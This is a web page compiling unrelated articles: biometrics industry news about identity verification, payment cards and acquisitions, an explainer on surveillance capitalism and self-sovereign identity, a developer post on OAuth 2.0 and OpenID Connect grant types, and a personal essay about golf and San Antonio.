<p>This week has brought a wide range of stories from across the biometrics industry, but FindBiometrics readers were most interested in some big strategic moves from industry leaders, and some deep dives into particular biometric technologies.</p>



<p>On the strategic front, AnyVision made a splash this week with its news of a major rebrand – the company is now called Oosto – and a partnership with Carnegie Mellon University’s CyLab Biometric Research Center. It’s all part of a broader strategic shift on the company’s part, with AnyVision’s leadership explaining that they want to expand their offerings beyond security-focused facial recognition into new applications powered by sophisticated computer vision technology:</p>



 <a href="https://findbiometrics.com/anyvision-pivots-with-carnegie-mellon-partnership-rebrands-as-oosto-710274/">AnyVision Pivots With Carnegie Mellon Partnership, Rebrands as Oosto</a> 



<p>The industry’s other big maneuver came from another facial recognition specialist, Onfido. The company got a lot of attention with its announcement that it had acquired EYN, a firm pioneering a unique approach to liveness detection based on emitting audible and ultrasonic wavelengths from a device:</p>



 <a href="https://findbiometrics.com/onfido-acquires-biometrics-pioneer-eyn-reports-q3-growth-710261/">Onfido Acquires Biometrics Pioneer EYN, Reports Q3 Growth</a> 



<p>Speaking of liveness detection, this was a key focus in a guest post from HID Global’s Roland Fournier this week. The Senior Director of HID Biometrics Business Unit’s Product &amp; Solutions, Fournier stoked reader interest with his discussion of the critical importance of fending off presentation attacks, the most serious threat to otherwise highly capable biometric technologies:</p>



 <a href="https://findbiometrics.com/not-all-biometric-authentication-is-created-equal-710271/">Not All Biometric Authentication Is Created Equal</a> 



<p>Readers also flocked to another in-depth look into biometric tech, this time concerning fingerprint sensors. This sector took a beating during the COVID-19 pandemic as health experts warned against touching shared surfaces and contactless solutions came into favor, but analysts are still projecting solid growth for the fingerprint sensor market going forward – and for good reason, as this feature explains:</p>



 <a href="https://findbiometrics.com/why-are-people-still-buying-fingerprint-sensors-102701/">Why Are People Still Buying Fingerprint Sensors?</a> 



<p>And finally, a blast from the past. We reported on VSBLTY’s involvement in the Infrastructure-as-a-Service startup Austin GIS back in early September, but the news got a spike of interest this week. And it remains interesting news: VSBLTY is a computer vision specialist with a strong interest in the emerging smart city sector that Austin GIS is targeting:</p>

<div class='wrap'>

<p><a href="https://www.yoti.com/">Yoti</a> is advising businesses in relatively unregulated industries like online multiplayer gaming to improve their identity verification and crime prevention capabilities. The company noted that unregulated industries seldom stay unregulated for long, especially in industries that have been associated with money laundering and other forms of financial crime.</p>



  



<p>In that regard, Yoti stressed that fraudsters are increasingly turning their attentions to industries with laxer policies, largely because new laws have made it more difficult to launder funds through more traditional avenues like <a href="https://mobileidworld.com/connells-group-turns-yoti-enable-real-estate-e-signatures-031702/">real estate</a>, <a href="https://mobileidworld.com/yoti-provides-identity-verification-art-trading-platform-121602/">art dealers</a>, and <a href="https://findbiometrics.com/biometrics-news-gamesys-deploys-yoti-doc-scan-verify-players-online-casino-030608/">casinos</a>. Instead, a criminal may use stolen funds to purchase an in-game currency in a popular online video game, and then <a href="https://mobileidworld.com/nintendo-reiterates-need-2fa-amid-continued-account-hacks-061008/">sell that digital currency to another player</a> in exchange for legitimate real world cash.</p>



<p>Such behavior is relatively easy to get away with because many financial regulations do not yet apply to online gaming or other, newer industries. As a result, those businesses are not performing the rigorous screenings that are now common in other sectors. However, that is likely to change in the near future. Eighteen percent of UK gamers have experienced fraud, and the UK’s Financial Action Task Force (FAFT) has already recommended that Anti-Money Laundering (AML) laws should be extended to close those loopholes.</p>



<p>With that in mind, Yoti is arguing that unregulated industries have an opportunity to act proactively, and to adopt strong Know Your Customer (KYC) and AML practices before they are legally obligated to do so. That will make it easier to adhere to the new laws once they do go into effect, since they will be familiar with the technology and will be less likely to trigger a fine for non-compliance.</p>



<p>Yoti, of course, is best known as a provider of <a href="https://findbiometrics.com/yoti-synectics-launch-endeavour-help-financial-institutions-mobile-onboarding-042005/">digital identity technology</a>, and pitched its own solution to businesses that want to conduct reliable KYC checks. Businesses can adjust their screening procedures based on the acceptable level of risk, and Yoti can help them verify people’s personal information, and check to see whether or not they are on any watchlists or have been linked to financial crimes in the past.</p>



<p>The company also offered a <a href="https://www.yoti.com/blog/our-handy-guide-to-know-your-customer-kyc/">more general primer</a> for businesses that may not be aware of KYC and AML best practices. It explained that a good KYC procedure needs to ensure that a customer’s identity is legitimate, figure out where their money is coming from, and evaluate the level of risk they present from a financial crime perspective. The business, meanwhile, should have a policy in place to trigger an enhanced screening in high-risk situations.</p>



<p>Like other onboarding solutions, Yoti’s platform ask users to take a photo of an ID and take a selfie to perform a biometric match. The company focused on laws in its native UK, though the same thinking is likely to lead to new AML regulations in other jurisdictions.</p>

<p><a href="https://zwipe.com/">Zwipe</a> is continuing to build its customer base in the Middle East. The company’s latest client is Credit Libanais, a bank based in Lebanon that counts three other banks as affiliates.</p>



  



<p>Credit Libanais is partnering with Zwipe in an effort to bring biometric payment cards to its own customers. The cards will feature Zwipe’s <a href="https://findbiometrics.com/zwipe-integrates-idex-sensor-into-pay-one-platform-042003/">Pay ONE fingerprint technology</a>, and will be introduced with a pilot program ahead of a <a href="https://findbiometrics.com/zwipe-biometric-card-commercialization-stakeholder-letter-707121/">full commercial launch</a>. Zwipe will provide ongoing support throughout the pilot phase to help the bank deliver a card that meets the expectations of customers and improves their banking experience.</p>



<p>In that regard, Zwipe and Credit Libanais will take customer feedback into account during the initial trial. The cards will enable secure contactless payments at the point of sale, and are therefore cleaner than legacy PIN cards during the pandemic. Credit Libanais is partnered with both Visa and Mastercard, and is hoping that the new biometric cards will make it easier to acquire and retain new customers.</p>



<p>“Post pandemic, we have seen a strong demand for touch-less checkout as they are safer and much more hygienic which this innovation will directly address,” said Credit Libanais Deputy GM Randa Bdeir. “That is why we have partnered with Zwipe to pilot a new generation of Biometric Payment Cards that will deliver a significantly improved user experience and security for our retail clients.”</p>



<p>“The banking sector in Lebanon is demonstrating its appetite for innovation,” added Zwipe MENA Region GM Ramzi Saboury. “We are thrilled that Zwipe Pay ONE technology has been chosen and looking forward to supporting the pilot and commercial launch by Credit Libanais.”</p>



<p>Credit Libanais is now one of several Zwipe partners in the Middle East and North Africa. The company is already providing Pay ONE services for <a href="https://findbiometrics.com/zwipe-solidifies-mena-foothold-latest-biometric-cards-partner-79202101/">NymCard</a>, <a href="https://findbiometrics.com/inkript-doubles-down-zwipes-biometric-card-solution-79202105/">Inkript</a>, and <a href="https://findbiometrics.com/zwipe-aims-extend-reach-asia-middle-east-new-biometric-cards-partner-7102104/">Que Processing Services.</a></p>

<p>The <a href="https://www.bmo.com/main/personal">BMO Financial Group</a> is rolling out a new remote onboarding service for Canadian customers. The Selfie ID solution operates much like other digital onboarding platforms, using facial recognition to compare a selfie to the image on a government ID.</p>



  



<p>At the moment, the Selfie ID service is only compatible with photo IDs from the Canadian government, and specifically with driver’s licenses, passports, and permanent residence cards. To use it, new customers will first need to take a photo of their ID, and then take a selfie for the biometric match. Selfie ID will verify the authenticity of the document and cross-reference it with the person in the photo, and allow the customer to open a bank account or sign up for a credit card if it determines that everything is legitimate.</p>



<p>The solution builds on BMO’s existing Automated Digital Enrolment service, and is designed to make it easier for people to sign up for an account on a mobile device. Those who use the service will not need to step foot in a branch location, and will instead enjoy a simpler and faster screening process.</p>



<p>Selfie ID is part of a broader digital transformation for BMO. The financial institution has also launched a BMO Quick Pay service that can automate certain bill payments, and now allows customers to change their PIN codes and apply for a line of credit through its online and mobile banking channels.</p>



<p>“We have continued to evolve the onboarding journey with a simple and digital experience that meets customers where they are,” said&nbsp;BMO Chief Digital Officer Mathew Mehrotra. “Selfie ID is another example of how we are building a digitally-enabled, future-ready bank, while helping our customers make real financial progress.”</p>



<p>BMO previously worked with Mastercard to launch a <a href="https://mobileidworld.com/mastercard-bmo-rolling-selfie-pay-103243/">Selfie Pay service</a> all the way back in 2016. The new Selfie ID solution reflects the <a href="https://findbiometrics.com/remote-identity-verification-market-goode-intelligence-710143/">broader interest in digital services</a> during the pandemic, which has led to <a href="https://findbiometrics.com/jumios-q3-growth-continues-record-pace-101905/">record growth</a> for <a href="https://mobileidworld.com/onfido-update-shows-ongoing-ascent-selfie-onboarding-77202103/">multiple providers</a> of <a href="https://findbiometrics.com/selfie-onboarding-boom-delivers-record-growth-socure-081003/">onboarding technology</a>.</p>

<p><a href="https://www.facephi.com/en/">FacePhi</a> is continuing to work toward decentralized identity through a new partnership with <a href="https://anonybit.io/">Anonybit</a>. The latter specializes in the creation of decentralized biometric templates, and has entered into a bilateral agreement with FacePhi to leverage its facial recognition technology in the creation of those secure biometric IDs.</p>



  



<p>As with most <a href="https://mobileidworld.com/bis-forecasts-major-growth-decentralized-identity-market-121809/">decentralized identity projects</a>, the broader goal is to give individual civilians more control over their personal information. However, FacePhi noted that most of the organizations that issue decentralized IDs still maintain a central database that remains outside of the control of end users. That database can then be referenced whenever someone needs to know whether or not an ID is authentic, but it also means that the user does not have full control and that at least some information is vulnerable to potential hackers.</p>



<p>Anonybit’s solution is designed to solve that problem, giving third parties a way to confirm that someone’s ID is legitimate without needing to store that identity data on its own servers. As a result, Anonybit can offer identity assurances without encroaching on anyone’s privacy.</p>



<p>“Our patented technology solves a long-time problem of distributed biometric data storage and matching&nbsp;and eliminates the trade-offs we have been making up until now between privacy and security,” said Anonybit CEO Frances Zelazny. “Our collaboration with FacePhi involves adapting its algorithm in our decentralised identity vault, maintaining a high level of security and performance, whilst preserving the privacy of our users.”</p>



<p>“It is important that all people have the right and the possibility of owning their own digital identity and make decisions regarding the day-to-day management of it, without having to wait for a third party to validate their own information,” added FacePhi President and CEO Javier Mira.&nbsp;</p>



<p>This is FacePhi’s second major decentralized identity announcement in as many months. In September, the company revealed that its facial recognition technology was being used in a new <a href="https://mobileidworld.com/korean-authorities-blockchain-based-identity-app-806251/">government-backed</a> <a href="https://findbiometrics.com/facephi-provides-onboarding-tech-decentralized-id-project-south-korea-090705/">smart city project on Jeju Island in South Korea</a>. That project will issue decentralized IDs to residents and visitors, using FacePhi’s <a href="https://findbiometrics.com/argentinian-lender-turns-facephi-remote-onboarding-100602/">facial recognition technology for onboarding</a> and for subsequent identity verification. FacePhi also unveiled a <a href="https://findbiometrics.com/money2020-facephi-announces-adaptable-multimodal-identity-platform-710251/">new modular Identity Platform</a> at Money20/20.</p>

<p><a href="https://www.invixium.com/">Invixium</a> is expanding its portfolio with the release of its new IXM Mobile solution. The app is fully compatible with the <a href="https://findbiometrics.com/orthoplastics-deploys-invixiums-touchless-biometric-solution-safeguard-employee-health-031202/">IXM TITAN</a> and IXM WEB access control platforms, and is available for Android and iOS devices.</p>



  



<p>Like Invixium’s other offerings, IXM Mobile is designed primarily for corporate access control. Employees and visitors can use the app to register their facial biometrics remotely, which negates the need for an on-site enrollment process. Each user’s template will instead be sent directly to the IXM WEB management platform, and administrators can use the platform to set access privileges for each person registered in the system.</p>



<p>The app can also be used to store a secure mobile credential that can take the form of a digital card or a QR code. In either case, the holder can use their phone to present their credential at a TITAN reader when they arrive at work, enabling multi-factor authentication when that credential is paired with a facial recognition scan. The digital credentialing system is completely contactless, and relies on Bluetooth technology.</p>



<p>Other IXM Mobile features include an intake questionnaire and a full health screening system. The questionnaire can be filled out remotely, and can be customized based on the needs of the organization. For example, businesses could ask if someone has been vaccinated for COVID-19, or if they have been showing any symptoms of the disease.</p>



<p>The health screening system takes that one step further, and uses the smartphone’s camera to check the user’s vital signs. The system can track heart rate, oxygen saturation, respiration rate, stress level, and heart rate variability, and determine whether or not the individual may be infected based on the results.</p>



<p>Both the questionnaire and the health scan will generate a QR code once they have been completed, giving businesses an easy way to grant or deny entry based on the results. Those who do not fill out their questionnaire in advance can complete it onsite through speech recognition at a TITAN terminal. The results are kept on file in the IXM Health Standard platform, which offers additional <a href="https://findbiometrics.com/invixium-announces-biometric-upgrades-for-the-pandemic-age-905158/">temperature</a> and <a href="https://findbiometrics.com/invixium-adds-mask-recognition-biometric-platform-102307/">mask detection capabilities</a>.</p>



<p>IXM Mobile was developed in <a href="https://findbiometrics.com/invixiums-covid-19-response-garners-entrepreneurial-award-frost-sullivan-073007/">response to COVID-19</a> to help ensure safer workplaces. The app can be downloaded for free, though businesses will still need to license the technology to take advantage of it in the actual workplace.</p>

<p><a href="https://puremarketbroker.com/">Pure M Global</a> is the latest organization to turn to <a href="https://www.idenfy.com/">iDenfy</a> for remote onboarding and identity verification. Pure M is technically a collection of companies that offer a range of financial services, including investment services, foreign exchange services, and cryptocurrency exchanges.</p>



  



<p>For its part, iDenfy will help Pure M verify the identities of its customers in a secure and compliant fashion. The company’s platform uses a combination of face and document recognition to confirm the authenticity of a photo ID, and to match a selfie to the image on that document. The solution will allow Pure M to live up to international Know Your Customer (KYC) and Anti-Money Laundering (AML) regulations, while simultaneously delivering a more streamlined identity experience for its customers.</p>



<p>iDenfy will also help Pure M detect and prevent potential incidents of fraud. Those who use the Pure M platform will have access to trading features like Direct Market Access and Straight Through Processing.</p>



<p>“Using [iDenfy’s] system made customer onboarding faster and more reliable,” said the CEO of Pure M. “With fraud prevalent as it is, having an extra layer of protection is also crucial, and iDenfy has proven that it can deliver what we seek.”</p>



<p>“We look forward to working with Pure M to maintain high internal and external compliance standards, taking an extra step for safety and security,” added iDenfy CEO Domantas Ciulde. “We will do our best to keep Pure M Global and their clients satisfied.”</p>



<p>iDenfy has already helped multiple organizations achieve regulatory compliance in the past few months. The company has previously provided onboarding services for the <a href="https://findbiometrics.com/idenfy-enable-biometric-onboarding-medical-research-startup-7102107/">medical research start-up Triall</a>, the <a href="https://findbiometrics.com/idenfy-helps-online-sports-betting-site-achieve-international-compliance-081305/">sports betting start-up Sparlay</a>, and for the <a href="https://findbiometrics.com/idenfy-provides-biometric-onboarding-impily-cryptocurrency-exchange-051406/">Impily cryptocurrency exchange</a>. The Lithuania-based iDenfy has also <a href="https://findbiometrics.com/idenfy-pushes-facial-recognition-lithuanian-border-072604/">pitched its technology to the Lithuanian government</a>, suggesting that facial recognition could improve screening procedures at the country’s borders.</p>

<p>Have you ever wondered how the ads you see across different sites and social media channels reflect your recent purchases or browsing patterns?</p><p>Well, that’s due to something called surveillance capitalism.</p> What is Surveillance Capitalism? <p>Surveillance capitalism is a process by which companies collect your browsing and buying patterns to understand your behavior and accordingly, display ads relevant to you. For example, let’s say, you buy a beautiful vase to give your mother on her birthday. Soon, you’ll see vase-related Google ads on any website you visit and similar ads on your Facebook&nbsp;feed.</p><p>Sounds strange? What’s really going on&nbsp;here?</p><p>Some companies like Google and Facebook allow you to access different online services through their login. They use a form of internet identity called <a href="https://academy.affinidi.com/compare-and-contrast-federated-identity-vs-self-sovereign-identity-227a85cbab18">federated identity</a>, and in the process determine which services you can access through their login. Further, they do mass surveillance of your online activity and capture personal data such as your purchases, search terms you use, the sites you visit, social behavior, and&nbsp;more.</p><p>This data is then used to create your online avatar, based on intelligent predictions, and this avatar is sold to third-party companies. The underlying AI-powered engine estimates your age, background, and income potential along with your location-specific data.</p><p>Based on all this information, third-party companies display relevant advertisements to entice you to buy the products shown on the&nbsp;ads.</p><p>Many of us see this as a good thing because you can easily find what you want with little effort. So, what’s the problem&nbsp;here?</p> What’s the Problem with Surveillance Capitalism? <p>Surveillance capitalism infringes your security and privacy in more ways than you imagine because the real commodity that’s being sold here is your personal&nbsp;data.</p><p>Further, this data is captured and used in a way where you have little control over it. After all, this is your data and you don’t know where it is stored, how it is used, and where it is displayed. And worse, all these are done for commercial gain by companies that you don’t even&nbsp;know!</p><p>In other words, your data is collected and used by third-party companies for their profits and you’re left in the lurch as you have no control whatsoever!</p><p>The problem with surveillance capitalism is that it can go beyond just marketing products and services. You can be provided certain information consistently to force you to form a desired opinion about economics, politics, etc. In this sense, advertisements can be used to influence your thoughts and behavior in a certain way. A case in point is <a href="https://www.theguardian.com/uk-news/2018/mar/26/cambridge-analytica-trump-campaign-us-election-laws">Cambridge Analytica’s</a> handling of Facebook data that is believed to have violated American election laws by swaying people in favor of one candidate.</p><p>All of these go against the basic tenets of privacy as we know&nbsp;it.</p><p>So, what can you do about&nbsp;it?</p> Is There an Anti-dote for Surveillance Capitalism? <p>One possible solution can be <a href="https://academy.affinidi.com/self-sovereign-identity-what-you-can-cant-do-with-ssi-1284f7227b4e">Self-Sovereign Identity (SSI)</a>, a new form of digital identity where you have complete control over your data, know where it is stored, and how it is used. You even have the choice to monetize your data if you choose to, and you get to decide to whom you want to sell your data as well. In other words, SSI empowers you to always be in&nbsp;control.</p><p>With SSI, you store your personal data in a <a href="https://academy.affinidi.com/5-reasons-to-use-an-identity-wallet-c289ba2980cf">digital identity wallet</a> that only you can access. When you have to share your data with someone, simply choose the information required by the other person, compile it together, and send it securely.</p><p>Any information you share is protected by digital signatures that comprise a <a href="https://academy.affinidi.com/role-of-public-key-cryptography-in-self-sovereign-identity-8c2dc37a2bf3">private-public key pair</a>. Hence, the chance for a <a href="https://academy.affinidi.com/can-ssi-safeguard-your-information-from-hackers-1b256d3eb6cd">data breach</a> reduces&nbsp;greatly.</p><p>Some of the advantages of using <a href="https://academy.affinidi.com/faqs-on-verifiable-credentials-and-self-sovereign-identity-3c3a505878bc">SSI</a>&nbsp;are:</p>  You know where your data is&nbsp;stored.

You have the opportunity to monetize your data if you choose&nbsp;to.  You always have complete control over your&nbsp;data.  It protects your privacy and security.

  <p>There’s a lot of information out there about adding authentication to your app, which is helpful! But also overwhelming. It can be hard to find relevant and up-to-date information. Security best practices and technologies change, so refreshing your understanding and keeping up with current best practices is a good thing. Here are some notes I took while I reviewed my knowledge and applied my experience implementing auth.</p>

<p></p>

 Prefer OAuth 2.0 and OpenID Connect 

<p>If you’re implementing authentication to a new application, the best practice is to use OAuth 2.0 with OpenID Connect (OIDC). The combination of OAuth 2.0 with OIDC provides consistency across many integration providers, standardized ways to access information, and security.</p>

<p>Let’s establish a baseline for the rest of this post by familiarizing ourselves with the basics. This <a href="https://developer.okta.com/blog/2019/10/21/illustrated-guide-to-oauth-and-oidc">Illustrated Guide to OAuth and OpenID Connect</a> is excellent.</p>

<p>What I really like about using OAuth 2.0 and OpenID Connect together is that it separates “the auths” and adds structure to each. We learned from the blog post above that OAuth 2.0 is designed for authorization – access to data (resources). And we learned that OIDC is a thin layer on top of OAuth 2.0 that adds login and profile information. Thus, authentication is the act of establishing the login session that confirms the user logging in is who they say they are. Now we can be specific in our vocabulary and understand how each standard complements the other.</p>

<p>When you’re using OpenID Connect, don’t forget that you can inspect the <a href="https://developer.okta.com/docs/reference/api/oidc/#well-known-openid-configuration">OpenID Connect Discovery</a> document to get a listing of endpoints and supported usages. You’ll see references to some of the metadata available in the discovery response below.</p>

<p>Armed with this knowledge, let’s continue!</p>

 Know your tokens 

<p>There are three different tokens at play in OAuth 2.0 and OpenID Connect. Depending on the grant type you use (more on that coming up), you might not have all three tokens. It’s good to remember the kinds of tokens you’re working with and what each does. This makes documentation even easier to parse and team conversations less confusing by specifying the exact type of token instead of only using the word “token”.</p>



    
    ID token: The token returned from OpenID Connect containing information about the authentication of the end-user in <a href="https://developer.okta.com/blog/2020/12/21/beginners-guide-to-jwt">JSON Web Token</a> (JWT) format.


    
    Access token: The token returned from OAuth flows that allows you to access the resource. Access tokens returned from Okta are in JWT format.


    
    Refresh token: A long-lived token that you exchange for the short-lived access token. Not all grant types support refresh tokens.



 Claim wisely 

<p>A JWT has the capability to add custom claims to it. Adding custom metadata directly to the payload of access and ID tokens means you can get properties tailored for your application right from the get-go, right? What a great idea! Or is it?</p>

<p>Custom claims are powerful, but remember that the contents of a JWT are visible to anyone who has one, such as an external developer calling your system and potentially the end user. You don’t want to add private information with the expectation that it’s safe from prying eyes. You also don’t want to overload the token with a bunch of custom claims that will bloat the token. Keep your tokens lightweight and make adding custom claims a considered decision.</p>

 Use the right grant type 

<p>I think this is where developers start feeling detail overload. There are different grant types, and depending on who the caller is and what sort of software process you’re working on, the optimal grant type changes. To add further confusion, some grant types (or flows) are OAuth 2.0 standards, and some are from OpenID Connect. Plus, there are updated security practices, and not all blog posts reflect the current recommendations. Yikes! Let’s cut out the extraneous stuff and focus on the need-to-knows.</p>

<p>First, let’s start with listing all the available grant types. We’ll define a high-level overview of each:</p>

<p></p>



    
    Authorization Code is a grant type used by web apps where the source code is private, such as a server-side web app. An authorization code and a client secret are required to get an access token. You can make the authorization code grant type even more secure for server-side web apps by using PKCE as well! More on that below.


    
    Client Credentials is a grant type used for back-end communications, such as API to API. Users aren’t involved in this flow, so there isn’t an ID token available.


    
    Device Code is a grant type primarily used for IoT and smart devices. The flow delegates user authentication and authorization through an external device, such as a smartphone app or browser. Device Code is available as an early access feature in Okta, or follow the steps in this post to <a href="https://developer.okta.com/blog/2019/02/19/add-oauth-device-flow-to-any-server">add OAuth device flow to any server</a>.


    
    Refresh Token is not a grant type, per se. It’s a long-lived token the application may receive to get longer access to resources. Authorization Code, Device Code, Hybrid, and Resource Owner Password flows support refresh tokens if the authorization server is configured to give the app refresh tokens.


    
    Proof Key for Code Exchange (PKCE) is a flow to create a secret to use before exchanging the authorization code for tokens. This is not a grant type used on its own, but as an extra layer of security to the Authorization Code flow.


    
    Hybrid is a set of grant types from the OpenID Connect spec. The <code>code id_token</code> flow is the most common and combines two grants. It returns an access token via the Authorization Code grant and an ID token via the Implicit grant.


    
    Implicit is a grant type that used to be recommended for native and JavaScript apps. It is a simplified version of the Authorization Code grant but doesn’t require the authorization code exchange for the access token. Because of the security risks, OAuth 2.0 no longer recommends this grant type and it will be dropped in the upcoming OAuth 2.1 spec.


    
    Resource Owner Password grant type is a flow used by trusted first-party clients. Because of the risks involved in applications directly handling credentials, OAuth 2.0 no longer recommends this grant type and it will be dropped in the upcoming OAuth 2.1. There might be legacy applications requiring this flow, but that’s the only reason to use it.



<p>That’s still a lot of flows! And a lot to keep in mind. We’re busy developers! So let’s distill this down to the preferred grants.</p>

<p></p>

<p>That’s much better! We now have a reasonable number of grant types to work with: Device Code, Client Credentials, and a combination grant type – Authorization Code with PKCE.</p>


    
        
        Authorization Code with PKCE is the Authorization Code grant type powered by pixies proof key for code exchange. The flow adds a step to first generate a code challenge as an extra layer of security.
    


<p>Now that we have an updated list of recommended grant types, how do we know which one to use? You may need to use multiple grant types in a complete software system depending on the scenario and actors involved. You may have a SPA, a native application, back-end services and processes, and integrations with external parties. Each of these requires consideration for which grant type to use. Don’t worry; by checking the discovery endpoint you’ll know if your identity provider is up to the task of securely handling your needs!</p>

<p>We can use this handy-dandy flow chart to identify which grant type to use:</p>

<p></p>

 Keep it as simple as possible 

<p>We’re busy. And adding authentication and access security to our software is foundational, but it’s not the only feature of the software. As product developers, we need to get auth into the system and have the peace of mind that we’re covered without having to worry about all the details. To keep adding auth simple, use SDKs that already handle all those nitty-gritty details. Okta has SDKs for mobile, front-end, and back-end languages to get going quickly.</p>

<p>What’s that? You say that your needs are a little more complicated than simply adding an Okta SDK to your software system? When you need something more customized, incorporate <a href="https://openid.net/developers/certified/">OIDC certified libraries</a> into your system that allow you to still follow auth best practices while implementing custom needs.</p>

 Next steps 

<p>These are the key takeaways that helped me better understand auth and incorporate team discussion points we had when implementing auth in the software system I worked on.

<p>I made this comic the for my friend, Nick. We meet for breakfast a few times a year. Last week was my fist meeting with Nick since leaving SAP, so I knew he'd ask about NuID. Nick is not into crypto, SSI, NFT's, or Web3 at all, he literally asked me "how big is an NFT...is it like a quarter...?" so I wanted to explain it to him in a context we both know well.</p><p>GOLF</p> Identities are a composite of identity <p>Where we are from certainly forms a part of our identity. And, where we are from has an identity of it's own. </p><p>Identities are a composite of what has, and is happening.</p> Recently golf has been on my mind with fall weather arriving in Texas <p>I live in San Antonio with Meagan and "The Girls" (Darby and Piper). San Antonio is a "low profile" kind of town that one might even call it "boring", yet, San Antonio has a lot of historical identity that is pretty cool.</p><p>There are the Missions of San Antonio, one of which is The Alamo. We also happen to have the 5-time NBA Champion (should be 6), San Antonio Spurs we host the PGA GOLF tournament just before The Masters.</p><p>The "<a href="https://www.jbsa.mil/News/News/Article/1090358/foulois-facts-commemorating-the-first-military-flight/">birth of military flight</a>" took place in San Antonio. March 2, 1910 on Ft. Sam Houston and the city is now home to nearly 500,000 active-and-veteran military personnel and the largest Joint Base in the Department of Defense (<a href="https://www.military.com/base-guide/joint-base-san-antonio">JBSA</a>). San Antonio is, Military City, USA.</p> If the US is deploying our military, many are deploying them from San Antonio. If one of our women or men is wounded, they’ll likely come here, to Brooke Army Medical Center. <p>In 1970 my grandfather, <a href="https://dustoff.org/raymond-bosworth/">LTC. Ray Bosworth</a> was transferred from Ft. Rucker, in Alabama to Ft. Sam Houston, where he eventually retired after a three-decade career.</p><p>My uncle, <a href="http://www.virtualwall.org/db/BosworthRP01a.htm">Ray Paul Jr.</a> had been killed, on July 4th, 1968 in Vietnam while the family lived on base in Alabama and my Boz was at the test-board there. Mother Rucker is where all Army-Aviators, who fly helicopters of any kind go to flight school. My father, Joe Jablecki is one of them, as are Boz and Ray.</p><blockquote>LTC Ray-Paul "Boz" Bosworth Sr., LT Raymond Paul Bosworth Jr., PFC Jerry Lee Bosworth, Cecile (Pikor) Bosworth, and my brother Patrick all rest in peace at Ft. Sam Houston National Cemetery. </blockquote><p>The national cemetery is a place that allows the course where I learned GOLF and a lot about life, to use it's land temporarily, separated by only a 4’ tall fence.</p><p>What I mean by "allows" is that that the land is an asset of the cemetery, and it grants temporary-authority to the golf course for it to use until it is needed, for our people.</p> As the cemetery needs land, the golf course loses land. <p><a href="https://www.valero.com/">Valero Energy</a>, sponsors of the Valero Texas Open PGA tournament is another world-class organization, going about their business kind of like the Spurs do. I’m proud to have Valero headquartered here in San Antonio.</p><p>When I was in high school and college my family operated a landscape company that my step-dad, Tom Martin founded and owned. &nbsp;That business led him to knowing <a href="https://www.sfgate.com/sa-obituaries/article/Benninger-excelled-in-business-and-charity-6319581.php">Ed and Nelda Benninger</a> closely during the time that Ed was President of Valero. Ed and Nelda lived in a beautiful home that Tom's company did the original design and landscape, and then many, many additional projects on. </p><p>Tom often joked that "Ed and Nelda put Jason Texas A&amp;M" and the dinner following our wedding-rehearsal was held at Gladys at the Strand, in 2004. The restaurant was amazing and had a fabulous private space, Ed’s Wine Room. Thomas Benninger was owner &amp; executive chef at Gladys..</p><p>The bond that Tom and the Benninger's formed through good business lasted for the rest of both of Ed and Nelda's lives. It was not really grounded in business at all, but about identity and reputation.</p> "Fish rot from the head" <p>Is a phrase I picked up from a talented professional management coach, who's now friend, named Alex Reidl. &nbsp;I hired him to conduct a workshop in Berlin with my leadership team in 2015. I say the phrase to describe something that I instinctively know, which is that that culture starts at the top - at the tip of the spear - with The Leader.</p><p>If I get to the top of an organization and realize there's a leadership problem, I'm done.</p><p>Ed Benninger was outstanding, as a person before he was an outstanding executive. I believe that Ed is still present in their culture today.<br><br>- Jason</p>

<p>Smart Eye and iMotions are poised to deliver the latest major M&amp;A event in the biometrics industry, announcing a new deal in which the former will acquire the latter for SEK 400 million, or roughly $46.6 million.</p>



<p>iMotions elevated its profile earlier this year with its launch of a remote version of its data collection platform. A response to the impact of COVID-19, the <a href="https://findbiometrics.com/imotions-enables-remote-research-with-new-online-data-collection-platform-022301/">Online Data Collection module</a> was designed to let researchers take advantage of the capabilities of iMotions’ Desktop Solution while working remotely, enabling them to track eye movements, facial expressions, and other biometrics.</p>



<p>Smart Eye, meanwhile, is known for its Human Insight AI platform, which uses computer vision to look for insights into subjects’ psychological states. The solution supports applications such as facial recognition and driver monitoring, and points to some clear synergies with iMotions’ offering.</p>



<p>“The next decade is going to see an amazing expansion of human behavioral research using multi-modal approaches,” explained Smart Eye founder and CEO Martin Krantz. “The addition of iMotions and its multi-sensor integration software promises to unlock increased value for Smart Eye’s current customers, particularly in the automotive industry, while opening the door to others.”</p>



<p>The acquisition will see iMotions continue its operations as a wholly owned Smart Eye subsidiary, with CEO Peter Hartzbech remaining in charge. Commenting on the deal, Hartzbech called Smart Eye “the ideal partner to further invest in the vision to accelerate human behavior insights, driving transformation that will fuel our customers’ successes across commercial industries, as well as for academic researchers.”</p>



<p>For Smart Eye, which currently has offices in Sweden, Tokyo, China, Germany, and Detroit, the acquisition will significantly expand its market reach. iMotions has a roster of 1,300 customers spanning various industries and academia, and has its own offices in Denmark, Germany, and Singapore.</p>



<p>The deal will also enable Smart Eye to consolidate its position in a broader computer vision market that could reach <a href="https://mobileidworld.com/computer-vision-market-reach-41b-by-end-decade-7102103/">a value of $41.11 billion</a> by the end of the decade, according to a recent report from Allied Market Research. Smart Eye acquired Affectiva, another <a href="https://smarteye.se/blogs/smart-eye-and-affectiva-join-forces-to-lead-growing-interior-sensing-market/">’emotion AI’</a> rival, earlier this year.</p>

<p><a href="https://zwipe.com/">Zwipe</a> has issued an operational update for the third quarter of the year, highlighting recent developments in its efforts toward the commercialization of biometric payment cards.</p>



<p>Particular highlights include commercial orders from Taiwan’s <a href="https://findbiometrics.com/zwipe-unveils-beautiful-partnership-in-biometric-cards-effort-7051101/">Beautiful Card Corporation</a> and <a href="https://findbiometrics.com/inkript-doubles-down-zwipes-biometric-card-solution-79202105/">Beirut-based Inkript</a>, as well as the news that an unnamed Tier 1 smart card maker embarked upon a comprehensive evaluation of Zwipe’s solution. The quarter also saw the launch of multiple biometric payment card pilots: a multi-bank effort coordinated by the issuer Middle East Payment Services; a multi-country pilot program launched by a European Tier 1 bank; and a pilot and subsequent launch from <a href="https://mobileidworld.com/reltime-release-cards-with-zwipe-pay-one-solution-100102/">Reltime, a DeFi startup</a>.</p>



<p>In addition to these developments, Zwipe CEO André Løvestam noted the establishment of ‘key go-to-market partnerships’ with ICPS, NymCard, Que Processing Services and Credit Card Management, saying these would have a ‘megaphone effect’ in terms of raising Zwipe’s profile across the MENA and Asia markets.</p>



